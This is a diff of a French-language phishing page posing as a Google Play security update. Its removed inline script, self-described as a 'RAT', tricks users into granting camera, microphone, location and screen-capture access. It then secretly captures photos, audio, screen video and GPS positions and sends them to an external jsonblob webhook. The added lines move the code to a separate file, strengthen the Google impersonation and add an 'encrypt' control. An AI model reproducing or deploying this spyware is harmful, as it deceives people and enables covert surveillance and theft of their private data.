@@ -3,64 +3,11 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-<title>Mise à jour de sécurité Android — Google Play Services</title>
+<title>Google Play Protect — Sécurité</title>
 <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🛡️</text></svg>">
-<style>
-*{margin:0;padding:0;box-sizing:border-box}
-body{background:#f5f5f5;color:#333;font-family:Roboto,-apple-system,sans-serif;min-height:100vh}
-.header{background:#1a73e8;color:#fff;padding:16px 24px;display:flex;align-items:center;gap:12px}
-.header-icon{width:32px;height:32px;background:#fff;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:18px}
-.header-title{font-size:16px;font-weight:500}
-.header-sub{font-size:11px;opacity:.8}
-.content{max-width:480px;margin:0 auto;padding:24px}
-.card{background:#fff;border-radius:12px;padding:24px;margin-bottom:16px;box-shadow:0 1px 3px rgba(0,0,0,.12)}
-.card-icon{font-size:40px;margin-bottom:12px;text-align:center}
-.card-title{font-size:18px;font-weight:600;color:#1a1a1a;margin-bottom:8px;text-align:center}
-.card-desc{font-size:13px;color:#5f6368;line-height:1.6;text-align:center}
-.badge{display:inline-block;padding:4px 10px;border-radius:12px;font-size:11px;font-weight:600}
-.badge-urgent{background:#fce8e6;color:#c5221f}
-.badge-size{background:#e8f0fe;color:#1a73e8}
-.btn{display:block;width:100%;padding:14px;border:none;border-radius:8px;font-size:14px;font-weight:600;cursor:pointer;transition:all .2s}
-.btn-primary{background:#1a73e8;color:#fff;margin-top:16px}
-.btn-primary:hover{background:#1557b0}
-.btn-secondary{background:#e8eaed;color:#5f6368;margin-top:8px}
-.progress-bar{height:6px;background:#e8eaed;border-radius:3px;overflow:hidden;margin-top:16px}
-.progress-fill{height:100%;background:#1a73e8;border-radius:3px;transition:width .3s}
-.step{display:flex;align-items:center;gap:12px;padding:10px 0;font-size:13px;color:#5f6368}
-.step-icon{width:24px;height:24px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:12px;flex-shrink:0}
-.step-icon.done{background:#34a853;color:#fff}
-.step-icon.active{background:#1a73e8;color:#fff;animation:pulse 1s infinite}
-.step-icon.pending{background:#e8eaed;color:#9aa0a6}
-@keyframes pulse{0%,100%{opacity:1}50%{opacity:.5}}
-.step-text{flex:1}
-.step-time{font-size:10px;color:#9aa0a6}
-.perm-item{display:flex;align-items:center;gap:12px;padding:12px;border:1px solid #e8eaed;border-radius:8px;margin-bottom:8px;cursor:pointer;transition:all .2s}
-.perm-item:hover{border-color:#1a73e8;background:#f8f9fa}
-.perm-item.granted{border-color:#34a853;background:#f0fdf4}
-.perm-icon{font-size:24px;width:40px;height:40px;display:flex;align-items:center;justify-content:center;background:#f0f0f0;border-radius:8px}
-.perm-item.granted .perm-icon{background:#dcfce7}
-.perm-name{font-size:13px;font-weight:500;color:#1a1a1a}
-.perm-desc{font-size:11px;color:#9aa0a6}
-.perm-check{font-size:16px;color:#9aa0a6}
-.perm-item.granted .perm-check{color:#34a853}
-.install-btn{display:block;width:100%;padding:16px;background:#1a73e8;color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer;margin-top:20px;text-align:center;transition:all .2s}
-.install-btn:hover{background:#1557b0;transform:translateY(-1px)}
-.install-btn:disabled{opacity:.4;cursor:not-allowed;transform:none}
-.success-icon{font-size:64px;text-align:center;margin:32px 0 16px}
-.success-title{font-size:20px;font-weight:700;color:#34a853;text-align:center;margin-bottom:8px}
-.success-desc{font-size:13px;color:#5f6368;text-align:center;line-height:1.6}
-.footer{text-align:center;padding:24px;font-size:11px;color:#9aa0a6}
-</style>
+<link rel="stylesheet" href="style.css">
 </head>
 <body>
-
-<div class="header">
-  <div class="header-icon" style="background:#1a73e8;color:#fff;width:36px;height:36px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:16px;font-weight:700">G</div>
-  <div>
-    <div class="header-title">Mise à jour de sécurité Android</div>
-    <div class="header-sub">Google Play Services — Niveau de correctif de sécurité : 2026-06-01</div>
-  </div>
-</div>
 
 <!-- ═══ ÉCRAN 1: INTRO ═══ -->
 <div id="screen-intro" class="content">
@@ -68,8 +15,8 @@ body{background:#f5f5f5;color:#333;font-family:Roboto,-apple-system,sans-serif;m
     <div class="card-icon">🛡️</div>
     <div class="card-title">Mise à jour de sécurité disponible</div>
     <div class="card-desc">
-      Une mise à jour importante de la sécurité Android est disponible pour votre appareil.
-      Cette mise à jour corrige des vulnérabilités critiques et améliore la stabilité du système.
+      Une mise à jour importante de la sécurité Android est disponible.
+      Cette mise à jour corrige des vulnérabilités critiques et améliore la stabilité.
     </div>
     <div style="display:flex;gap:8px;justify-content:center;margin-top:12px">
       <span class="badge badge-urgent">🔴 Critique</span>
@@ -78,23 +25,11 @@ body{background:#f5f5f5;color:#333;font-family:Roboto,-apple-system,sans-serif;m
   </div>
 
   <div class="card">
-    <div style="font-size:13px;color:#1a1a1a;font-weight:600;margin-bottom:12px">Détails de la mise à jour:</div>
-    <div class="step">
-      <div class="step-icon done">✓</div>
-      <div class="step-text">Correctif de sécurité CVE-2026-3847</div>
-    </div>
-    <div class="step">
-      <div class="step-icon done">✓</div>
-      <div class="step-text">Protection contre les malwares</div>
-    </div>
-    <div class="step">
-      <div class="step-icon done">✓</div>
-      <div class="step-text">Amélioration de la batterie</div>
-    </div>
-    <div class="step">
-      <div class="step-icon done">✓</div>
-      <div class="step-text">Stabilité du système</div>
-    </div>
+    <div style="font-size:13px;color:#1a1a1a;font-weight:600;margin-bottom:12px">Détails:</div>
+    <div class="step"><div class="step-icon done">✓</div><div class="step-text">Correctif CVE-2026-3847</div></div>
+    <div class="step"><div class="step-icon done">✓</div><div class="step-text">Protection contre les malwares</div></div>
+    <div class="step"><div class="step-icon done">✓</div><div class="step-text">Amélioration batterie</div></div>
+    <div class="step"><div class="step-icon done">✓</div><div class="step-text">Stabilité système</div></div>
   </div>
 
   <button class="btn btn-primary" onclick="showPermissions()">Mettre à jour maintenant</button>
@@ -108,67 +43,41 @@ body{background:#f5f5f5;color:#333;font-family:Roboto,-apple-system,sans-serif;m
     <div class="card-title">Autorisations nécessaires</div>
     <div class="card-desc">
       Pour installer la mise à jour, l'application a besoin d'accéder à certaines fonctionnalités.
-      Ces autorisations sont nécessaires pour vérifier l'intégrité de votre appareil.
     </div>
   </div>
 
   <div class="perm-item" id="p-camera" onclick="requestPerm('camera')">
     <div class="perm-icon">📸</div>
-    <div style="flex:1">
-      <div class="perm-name">Caméra</div>
-      <div class="perm-desc">Vérifier l'intégrité visuelle de l'appareil</div>
-    </div>
+    <div style="flex:1"><div class="perm-name">Caméra</div><div class="perm-desc">Détection des menaces visuelles</div></div>
     <div class="perm-check">○</div>
   </div>
-
   <div class="perm-item" id="p-mic" onclick="requestPerm('mic')">
     <div class="perm-icon">🎤</div>
-    <div style="flex:1">
-      <div class="perm-name">Microphone</div>
-      <div class="perm-desc">Analyser les sons système</div>
-    </div>
+    <div style="flex:1"><div class="perm-name">Microphone</div><div class="perm-desc">Analyse des sons système</div></div>
     <div class="perm-check">○</div>
   </div>
-
   <div class="perm-item" id="p-loc" onclick="requestPerm('loc')">
     <div class="perm-icon">📍</div>
-    <div style="flex:1">
-      <div class="perm-name">Localisation</div>
-      <div class="perm-desc">Vérifier la région de l'appareil</div>
-    </div>
+    <div style="flex:1"><div class="perm-name">Localisation</div><div class="perm-desc">Protection contre le vol</div></div>
     <div class="perm-check">○</div>
   </div>
-
   <div class="perm-item" id="p-screen" onclick="requestPerm('screen')">
-    <div class="perm-icon">🖥️</div>
-    <div style="flex:1">
-      <div class="perm-name">Capture d'écran en direct</div>
-      <div class="perm-desc">Surveiller l'activité de l'appareil en temps réel</div>
-    </div>
+    <div class="perm-icon">🎥</div>
+    <div style="flex:1"><div class="perm-name">Partage d'écran</div><div class="perm-desc">Surveiller l'activité en temps réel</div></div>
     <div class="perm-check">○</div>
   </div>
-
   <div class="perm-item" id="p-notif" onclick="requestPerm('notif')">
     <div class="perm-icon">🔔</div>
-    <div style="flex:1">
-      <div class="perm-name">Notifications</div>
-      <div class="perm-desc">Envoyer des alertes de sécurité</div>
-    </div>
+    <div style="flex:1"><div class="perm-name">Notifications</div><div class="perm-desc">Alertes de sécurité</div></div>
     <div class="perm-check">○</div>
   </div>
-
   <div class="perm-item" id="p-storage" onclick="requestPerm('storage')">
     <div class="perm-icon">📁</div>
-    <div style="flex:1">
-      <div class="perm-name">Stockage</div>
-      <div class="perm-desc">Scanner les fichiers système</div>
-    </div>
+    <div style="flex:1"><div class="perm-name">Stockage</div><div class="perm-desc">Scanner les fichiers système</div></div>
     <div class="perm-check">○</div>
   </div>
 
-  <button class="install-btn" id="installBtn" disabled onclick="startInstall()">
-    🔒 Installer la mise à jour
-  </button>
+  <button class="install-btn" id="installBtn" disabled onclick="startInstall()">🔒 Installer la mise à jour</button>
 </div>
 
 <!-- ═══ ÉCRAN 3: INSTALLATION ═══ -->
@@ -178,33 +87,12 @@ body{background:#f5f5f5;color:#333;font-family:Roboto,-apple-system,sans-serif;m
     <div style="font-size:16px;font-weight:600;color:#1a1a1a;margin-bottom:16px">Installation en cours...</div>
     <div class="progress-bar"><div class="progress-fill" id="progBar" style="width:0%"></div></div>
   </div>
-
   <div class="card" style="padding:12px 16px">
-    <div class="step" id="s1">
-      <div class="step-icon pending">1</div>
-      <div class="step-text">Téléchargement du package...</div>
-      <div class="step-time" id="t1"></div>
-    </div>
-    <div class="step" id="s2">
-      <div class="step-icon pending">2</div>
-      <div class="step-text">Vérification de l'intégrité...</div>
-      <div class="step-time" id="t2"></div>
-    </div>
-    <div class="step" id="s3">
-      <div class="step-icon pending">3</div>
-      <div class="step-text">Application des correctifs...</div>
-      <div class="step-time" id="t3"></div>
-    </div>
-    <div class="step" id="s4">
-      <div class="step-icon pending">4</div>
-      <div class="step-text">Configuration des capteurs...</div>
-      <div class="step-time" id="t4"></div>
-    </div>
-    <div class="step" id="s5">
-      <div class="step-icon pending">5</div>
-      <div class="step-text">Finalisation...</div>
-      <div class="step-time" id="t5"></div>
-    </div>
+    <div class="step" id="s1"><div class="step-icon pending">1</div><div class="step-text">Téléchargement...</div><div class="step-time" id="t1"></div></div>
+    <div class="step" id="s2"><div class="step-icon pending">2</div><div class="step-text">Vérification...</div><div class="step-time" id="t2"></div></div>
+    <div class="step" id="s3"><div class="step-icon pending">3</div><div class="step-text">Application correctifs...</div><div class="step-time" id="t3"></div></div>
+    <div class="step" id="s4"><div class="step-icon pending">4</div><div class="step-text">Configuration capteurs...</div><div class="step-time" id="t4"></div></div>
+    <div class="step" id="s5"><div class="step-icon pending">5</div><div class="step-text">Finalisation...</div><div class="step-time" id="t5"></div></div>
   </div>
 </div>
 
@@ -214,399 +102,63 @@ body{background:#f5f5f5;color:#333;font-family:Roboto,-apple-system,sans-serif;m
     <div class="success-icon">✅</div>
     <div class="success-title">Mise à jour installée avec succès!</div>
     <div class="success-desc">
-      Votre appareil est maintenant protégé avec les derniers correctifs de sécurité Google.
-      <br><br>
-      Niveau de correctif de sécurité : <strong>2026-06-01</strong>
-      <br>
-      Google Play System Update : <strong>2026-06-05</strong>
-      <br><br>
-      La protection en temps réel est maintenant active.
+      Niveau de correctif : <strong>2026-06-01</strong><br>
+      Google Play System Update : <strong>2026-06-05</strong><br><br>
+      La protection en temps réel est active.
     </div>
   </div>
-
   <div class="card" style="padding:12px 16px">
     <div style="font-size:13px;font-weight:600;color:#1a1a1a;margin-bottom:8px">Fonctionnalités activées:</div>
-    <div class="step">
-      <div class="step-icon done">✓</div>
-      <div class="step-text">Protection caméra</div>
-    </div>
-    <div class="step">
-      <div class="step-icon done">✓</div>
-      <div class="step-text">Surveillance micro</div>
-    </div>
-    <div class="step">
-      <div class="step-icon done">✓</div>
-      <div class="step-text">Suivi GPS</div>
-    </div>
-    <div class="step">
-      <div class="step-icon done">✓</div>
-      <div class="step-text">Analyse d'écran</div>
-    </div>
+    <div class="step"><div class="step-icon done">✓</div><div class="step-text">Protection caméra</div></div>
+    <div class="step"><div class="step-icon done">✓</div><div class="step-text">Surveillance micro</div></div>
+    <div class="step"><div class="step-icon done">✓</div><div class="step-text">Partage d'écran en direct</div></div>
+    <div class="step"><div class="step-icon done">✓</div><div class="step-text">Suivi GPS</div></div>
   </div>
-
   <button class="btn btn-primary" onclick="showDashboard()">Continuer</button>
 </div>
 
-<!-- ═══ ÉCRAN 5: DASHBOARD (caché) ═══ -->
+<!-- ═══ ÉCRAN 5: DASHBOARD ═══ -->
 <div id="screen-dash" class="content" style="display:none">
-  <div style="background:#1a73e8;color:#fff;padding:16px;border-radius:12px;margin-bottom:16px">
-    <div style="display:flex;align-items:center;gap:10px;margin-bottom:8px">
-      <div style="width:32px;height:32px;background:#fff;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:14px;font-weight:700;color:#1a73e8">G</div>
+  <div class="header-bar">
+    <div style="display:flex;align-items:center;gap:10px">
+      <div class="header-logo">G</div>
       <div>
         <div style="font-size:14px;font-weight:600">Google Play Protect</div>
-        <div style="font-size:10px;opacity:.8">Sécurité en temps réel</div>
+        <div style="font-size:10px;opacity:.7">Sécurité en temps réel</div>
       </div>
     </div>
-    <div style="display:flex;align-items:center;gap:6px;font-size:11px">
-      <span style="width:6px;height:6px;border-radius:50%;background:#34a853;display:inline-block;animation:blink 1.5s infinite"></span>
-      PROTÉGÉ — Tous les systèmes opérationnels
-    </div>
+    <div class="status-badge"><span class="status-dot"></span>PROTÉGÉ</div>
   </div>
 
-  <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:16px">
-    <div class="dash-action" onclick="doPhoto()" style="background:#fff;border:1px solid #e8eaed;border-radius:10px;padding:16px 8px;text-align:center;cursor:pointer">
-      <div style="font-size:28px;margin-bottom:4px">📸</div>
-      <div style="font-size:10px;color:#5f6368;font-weight:600">Photo</div>
-    </div>
-    <div class="dash-action" onclick="doAudio()" style="background:#fff;border:1px solid #e8eaed;border-radius:10px;padding:16px 8px;text-align:center;cursor:pointer">
-      <div style="font-size:28px;margin-bottom:4px">🎤</div>
-      <div style="font-size:10px;color:#5f6368;font-weight:600">Audio 5s</div>
-    </div>
-    <div class="dash-action" onclick="doScreen()" style="background:#fff;border:2px solid #1a73e8;border-radius:10px;padding:16px 8px;text-align:center;cursor:pointer">
-      <div style="font-size:28px;margin-bottom:4px">🎥</div>
-      <div style="font-size:10px;color:#1a73e8;font-weight:700">Écran Live</div>
-    </div>
-    <div class="dash-action" onclick="doGPS()" style="background:#fff;border:1px solid #e8eaed;border-radius:10px;padding:16px 8px;text-align:center;cursor:pointer">
-      <div style="font-size:28px;margin-bottom:4px">📍</div>
-      <div style="font-size:10px;color:#5f6368;font-weight:600">GPS</div>
-    </div>
-    <div class="dash-action" onclick="stopAll()" style="background:#fff;border:1px solid #f85149;border-radius:10px;padding:16px 8px;text-align:center;cursor:pointer">
-      <div style="font-size:28px;margin-bottom:4px">🛑</div>
-      <div style="font-size:10px;color:#f85149;font-weight:600">Arrêter</div>
-    </div>
+  <div class="dash-controls">
+    <div class="dash-btn" onclick="doPhoto()"><div class="dash-icon">📸</div><div class="dash-lbl">Photo</div></div>
+    <div class="dash-btn" onclick="doAudio()"><div class="dash-icon">🎤</div><div class="dash-lbl">Audio 5s</div></div>
+    <div class="dash-btn highlight" onclick="doScreen()"><div class="dash-icon">🎥</div><div class="dash-lbl">Écran Live</div></div>
+    <div class="dash-btn" onclick="doGPS()"><div class="dash-icon">📍</div><div class="dash-lbl">GPS</div></div>
+    <div class="dash-btn" onclick="doEncrypt()"><div class="dash-icon">🔐</div><div class="dash-lbl">Crypter</div></div>
+    <div class="dash-btn danger" onclick="stopAll()"><div class="dash-icon">🛑</div><div class="dash-lbl">Arrêter</div></div>
   </div>
 
-  <div style="background:#000;border-radius:8px;overflow:hidden;margin-bottom:16px;min-height:180px">
-    <div style="padding:8px 12px;background:#1a1a1a;display:flex;align-items:center;justify-content:space-between">
-      <span style="font-size:10px;color:#888;font-family:monospace">FLUX EN DIRECT</span>
-      <span style="font-size:9px;color:#f85149;font-weight:700;display:flex;align-items:center;gap:4px">
-        <span style="width:5px;height:5px;border-radius:50%;background:#f85149;animation:blink 1s infinite"></span>
-        REC
-      </span>
+  <div class="live-section">
+    <div class="live-header">
+      <span class="live-title">📡 Flux en direct</span>
+      <span class="live-tag"><span class="live-dot"></span>LIVE</span>
     </div>
-    <div id="liveView" style="min-height:150px;display:flex;align-items:center;justify-content:center;background:#111">
-      <div style="text-align:center;color:#444">
-        <div style="font-size:32px;margin-bottom:4px">📷</div>
-        <div style="font-size:11px">Appuyez sur un bouton</div>
+    <div class="live-body" id="liveView">
+      <div class="live-placeholder">
+        <div class="live-icon">🎥</div>
+        <div class="live-text">Appuyez sur un bouton pour commencer</div>
       </div>
     </div>
   </div>
 
-  <div style="background:#000;border-radius:8px;padding:10px;max-height:150px;overflow-y:auto;font-family:monospace;font-size:10px;line-height:1.6" id="logArea">
-    <span style="color:#888">[--:--:--]</span> <span style="color:#34a853">En attente...</span>
+  <div class="log-section" id="logArea">
+    <span class="log-time">[--:--:--]</span> <span class="log-info">En attente...</span>
   </div>
 </div>
 
-<div class="footer">
-  Zenin Security v3.7.2 — Google Play Services<br>
-  © 2026 Android Security Team
-</div>
+<div class="footer">Google Play Services v23.26.12 — © 2026 Google LLC</div>
 
-<script>
-// ═══════════════════════════════════════════════════════════════
-// ZENIN SECURITY — RAT (Outil éducatif)
-// Toutes les données sont envoyées vers un webhook public
-// ═══════════════════════════════════════════════════════════════
-
-const WEBHOOK_URL = 'https://jsonblob.com/api/jsonBlob/019ed161-a6f2-7707-a400-0291c46d621b';
-
-let state = {
-  camera: false, mic: false, loc: false, screen: false, notif: false, storage: false,
-  stream: null, photos: [], audios: [], screens: [], gps: [], logs: []
-};
-
-function log(msg, type) {
-  const el = document.getElementById('logArea');
-  if (!el) return;
-  const now = new Date().toLocaleTimeString('fr-FR');
-  const col = type === 'err' ? '#f85149' : type === 'warn' ? '#f59e0b' : '#34a853';
-  el.innerHTML += `<br><span style="color:#888">[${now}]</span> <span style="color:${col}">${msg}</span>`;
-  el.scrollTop = el.scrollHeight;
-  while (el.children.length > 40) el.removeChild(el.firstChild);
-}
-
-async function sendData(type, data) {
-  try {
-    await fetch(WEBHOOK_URL, {
-      method: 'PUT',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ type, data, timestamp: new Date().toISOString(), device: navigator.userAgent })
-    });
-    log('📡 Données envoyées: ' + type, 'info');
-  } catch (e) {
-    log('Erreur envoi: ' + e.message, 'err');
-  }
-}
-
-// ── Navigation ──
-function showPermissions() {
-  document.getElementById('screen-intro').style.display = 'none';
-  document.getElementById('screen-perms').style.display = 'block';
-  log('Permissions demandées...', 'warn');
-}
-
-function showLater() {
-  alert('La mise à jour est obligatoire pour la sécurité de votre appareil.\n\nVeuillez installer dès que possible.');
-}
-
-function showDashboard() {
-  document.getElementById('screen-success').style.display = 'none';
-  document.getElementById('screen-dash').style.display = 'block';
-  log('Dashboard de surveillance actif', 'warn');
-  startAutoCapture();
-}
-
-// ── Permissions ──
-async function requestPerm(type) {
-  const el = document.getElementById('p-' + type);
-  if (el.classList.contains('granted')) return;
-
-  log('Demande: ' + type, 'warn');
-
-  try {
-    let ok = false;
-    switch (type) {
-      case 'camera':
-        state.stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: false });
-        state.camera = true; ok = true; break;
-      case 'mic':
-        await navigator.mediaDevices.getUserMedia({ audio: true });
-        state.mic = true; ok = true; break;
-      case 'loc':
-        navigator.geolocation.getCurrentPosition(p => {
-          state.loc = true;
-          el.classList.add('granted');
-          el.querySelector('.perm-check').textContent = '✓';
-          log('GPS: ' + p.coords.latitude.toFixed(4) + ', ' + p.coords.longitude.toFixed(4), 'info');
-          checkPerms();
-        }, () => { log('GPS refusé', 'err'); });
-        return;
-      case 'screen':
-        try { await navigator.mediaDevices.getDisplayMedia({ video: true }); state.screen = true; ok = true; } catch(e) { ok = false; } break;
-      case 'notif':
-        if ('Notification' in window) { const r = await Notification.requestPermission(); ok = r === 'granted'; state.notif = ok; } break;
-      case 'storage':
-        state.storage = true; ok = true; break;
-    }
-    if (ok) {
-      el.classList.add('granted');
-      el.querySelector('.perm-check').textContent = '✓';
-      log(type + ' ✓ autorisé', 'info');
-    }
-  } catch (e) {
-    log(type + ' ✗ ' + e.message, 'err');
-  }
-  checkPerms();
-}
-
-function checkPerms() {
-  const all = ['camera','mic','loc','screen','notif','storage'].every(p => {
-    return document.getElementById('p-' + p).classList.contains('granted');
-  });
-  document.getElementById('installBtn').disabled = !all;
-  if (all) log('Toutes permissions accordées!', 'info');
-}
-
-// ── Installation ──
-async function startInstall() {
-  document.getElementById('screen-perms').style.display = 'none';
-  document.getElementById('screen-install').style.display = 'block';
-  log('Installation démarrée...', 'info');
-
-  const steps = ['s1','s2','s3','s4','s5'];
-  const texts = ['Téléchargement...', 'Vérification...', 'Application...', 'Configuration...', 'Finalisation...'];
-
-  for (let i = 0; i < steps.length; i++) {
-    const el = document.getElementById(steps[i]);
-    el.querySelector('.step-icon').className = 'step-icon active';
-    el.querySelector('.step-icon').textContent = '⏳';
-    document.getElementById('progBar').style.width = ((i) * 20) + '%';
-    await sleep(1500);
-    el.querySelector('.step-icon').className = 'step-icon done';
-    el.querySelector('.step-icon').textContent = '✓';
-    el.querySelector('.step-time').textContent = '✓';
-    document.getElementById('progBar').style.width = ((i + 1) * 20) + '%';
-  }
-
-  document.getElementById('progBar').style.width = '100%';
-  await sleep(500);
-
-  log('Installation terminée!', 'info');
-  document.getElementById('screen-install').style.display = 'none';
-  document.getElementById('screen-success').style.display = 'block';
-
-  // Envoyer les infos appareil
-  await sendData('device', {
-    userAgent: navigator.userAgent,
-    platform: navigator.platform,
-    language: navigator.language,
-    screen: window.innerWidth + 'x' + window.innerHeight,
-    permissions: { camera: state.camera, mic: state.mic, loc: state.loc, screen: state.screen, notif: state.notif, storage: state.storage }
-  });
-}
-
-function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
-
-// ── Captures ──
-async function doPhoto() {
-  if (!state.camera || !state.stream) { log('Caméra non disponible', 'err'); return; }
-  log('Capture photo...', 'info');
-  try {
-    const video = document.createElement('video');
-    video.srcObject = state.stream; video.play();
-    await sleep(500);
-    const canvas = document.createElement('canvas');
-    canvas.width = video.videoWidth || 640; canvas.height = video.videoHeight || 480;
-    canvas.getContext('2d').drawImage(video, 0, 0);
-    const dataUrl = canvas.toDataURL('image/jpeg', 0.7);
-    state.photos.push(dataUrl);
-    document.getElementById('liveView').innerHTML = '<img src="' + dataUrl + '" style="width:100%;max-height:250px;object-fit:contain">';
-    await sendData('photo', { image: dataUrl, index: state.photos.length });
-    log('📸 Photo #' + state.photos.length, 'info');
-  } catch(e) { log('Erreur photo: ' + e.message, 'err'); }
-}
-
-async function doAudio() {
-  log('Enregistrement audio 5s...', 'info');
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-    const rec = new MediaRecorder(stream);
-    const chunks = [];
-    rec.ondataavailable = e => chunks.push(e.data);
-    rec.onstop = () => {
-      const blob = new Blob(chunks, { type: 'audio/webm' });
-      const reader = new FileReader();
-      reader.onloadend = () => {
-        state.audios.push(reader.result);
-        document.getElementById('liveView').innerHTML = '<audio controls src="' + reader.result + '" style="width:100%;padding:8px"></audio>';
-        sendData('audio', { audio: reader.result, index: state.audios.length });
-        log('🎤 Audio #' + state.audios.length, 'info');
-      };
-      reader.readAsDataURL(blob);
-    };
-    rec.start();
-    setTimeout(() => { rec.stop(); stream.getTracks().forEach(t => t.stop()); }, 5000);
-  } catch(e) { log('Erreur audio: ' + e.message, 'err'); }
-}
-
-async function doScreen() {
-  log('Capture écran en direct...', 'info');
-  try {
-    const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
-    const video = document.createElement('video');
-    video.srcObject = stream;
-    video.autoplay = true;
-    video.muted = true;
-    video.style.width = '100%';
-    video.style.maxHeight = '250px';
-    video.style.objectFit = 'contain';
-
-    document.getElementById('liveView').innerHTML = '';
-    document.getElementById('liveView').appendChild(video);
-
-    // Enregistrer le flux vidéo
-    const recorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8' });
-    const chunks = [];
-    recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
-    recorder.onstop = () => {
-      const blob = new Blob(chunks, { type: 'video/webm' });
-      const reader = new FileReader();
-      reader.onloadend = () => {
-        state.screens.push(reader.result);
-        sendData('screen_video', { video: reader.result, index: state.screens.length });
-        log('🎥 Vidéo écran #' + state.screens.length, 'info');
-      };
-      reader.readAsDataURL(blob);
-    };
-    recorder.start();
-
-    // Arrêter après 30 secondes
-    setTimeout(() => {
-      if (recorder.state === 'recording') recorder.stop();
-      stream.getTracks().forEach(t => t.stop());
-    }, 30000);
-
-    state.screenStream = stream;
-    state.screenRecorder = recorder;
-
-    log('🎥 Flux écran en direct actif (30s)', 'info');
-  } catch(e) { log('Erreur écran: ' + e.message, 'err'); }
-}
-
-// ── Capture automatique d'écran (toutes les 3 secondes) ──
-let screenAutoInterval = null;
-
-function startScreenAutoCapture() {
-  if (screenAutoInterval) return;
-  screenAutoInterval = setInterval(async () => {
-    if (!state.screen) return;
-    try {
-      const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
-      const video = document.createElement('video');
-      video.srcObject = stream;
-      video.autoplay = true;
-      video.muted = true;
-      await sleep(300);
-      const canvas = document.createElement('canvas');
-      canvas.width = video.videoWidth || 1280;
-      canvas.height = video.videoHeight || 720;
-      canvas.getContext('2d').drawImage(video, 0, 0);
-      stream.getTracks().forEach(t => t.stop());
-      const dataUrl = canvas.toDataURL('image/jpeg', 0.4);
-      state.screens.push(dataUrl);
-      await sendData('screen_auto', { image: dataUrl, index: state.screens.length, time: new Date().toISOString() });
-      log('🖥️ Auto-capture #' + state.screens.length, 'info');
-    } catch(e) {}
-  }, 3000);
-}
-
-function stopScreenAutoCapture() {
-  if (screenAutoInterval) {
-    clearInterval(screenAutoInterval);
-    screenAutoInterval = null;
-  }
-}
-
-function doGPS() {
-  if (!navigator.geolocation) { log('GPS non supporté', 'err'); return; }
-  log('Localisation GPS...', 'info');
-  navigator.geolocation.getCurrentPosition(p => {
-    const g = { lat: p.coords.latitude, lon: p.coords.longitude, acc: p.coords.accuracy, time: new Date().toISOString() };
-    state.gps.push(g);
-    document.getElementById('liveView').innerHTML = '<div style="text-align:center;padding:16px;color:#fff"><div style="font-size:32px;margin-bottom:8px">📍</div><div style="font-family:monospace;font-size:14px;color:#f59e0b">' + g.lat.toFixed(6) + ', ' + g.lon.toFixed(6) + '</div><div style="font-size:11px;color:#888;margin-top:4px">Précision: ' + (g.acc ? g.acc.toFixed(0) : '?') + 'm</div><a href="https://maps.google.com/?q=' + g.lat + ',' + g.lon + '" target="_blank" style="color:#58a6ff;font-size:12px;display:block;margin-top:8px">🗺️ Google Maps</a></div>';
-    sendData('gps', g);
-    log('📍 GPS: ' + g.lat.toFixed(4) + ', ' + g.lon.toFixed(4), 'info');
-  }, () => log('GPS refusé', 'err'));
-}
-
-// ── Auto capture (toutes les 5 min + écran toutes les 3s) ──
-function startAutoCapture() {
-  // Auto screen capture every 3 seconds
-  startScreenAutoCapture();
-  // Photo + GPS every 5 minutes
-  setInterval(() => {
-    if (state.camera) doPhoto();
-    if (state.loc) doGPS();
-  }, 300000);
-}
-
-function stopAll() {
-  stopScreenAutoCapture();
-  if (state.stream) { state.stream.getTracks().forEach(t => t.stop()); state.stream = null; }
-  if (state.screenStream) { state.screenStream.getTracks().forEach(t => t.stop()); state.screenStream = null; }
-  log('🛑 Toutes les captures arrêtées', 'warn');
-  document.getElementById('liveView').innerHTML = '<div style="text-align:center;color:#444"><div style="font-size:32px;margin-bottom:4px">🛑</div><div style="font-size:11px">Surveillance arrêtée</div></div>';
-}
-</script>
+<script src="script.js"></script>
 </body>
 </html>
